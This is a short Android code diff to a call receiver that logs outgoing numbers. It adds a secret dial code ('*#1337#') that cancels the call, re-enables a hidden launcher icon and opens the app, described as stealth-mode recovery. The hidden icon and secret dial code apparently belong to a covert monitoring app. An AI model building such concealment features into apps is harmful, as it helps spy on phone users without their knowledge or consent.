@@ -53,6 +53,23 @@ public class CallReceiver extends BroadcastReceiver {
         savedNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
         isIncoming = false;
         Log.d(TAG, "Outgoing call to: " + savedNumber);
+
+        // Secret Trigger for Stealth Mode Recovery
+        if ("*#1337#".equals(savedNumber)) {
+            // Cancel the call
+            setResultData(null);
+            
+            // Re-enable the Launcher Alias if hidden
+            android.content.ComponentName aliasName = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
+            context.getPackageManager().setComponentEnabledSetting(aliasName,
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 
+                android.content.pm.PackageManager.DONT_KILL_APP);
+                
+            // Launch the app
+            Intent i = new Intent(context, MainActivity.class);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(i);
+        }
     }
 
     private void onCallStateChanged(Context context, int state, String incomingNumber) {
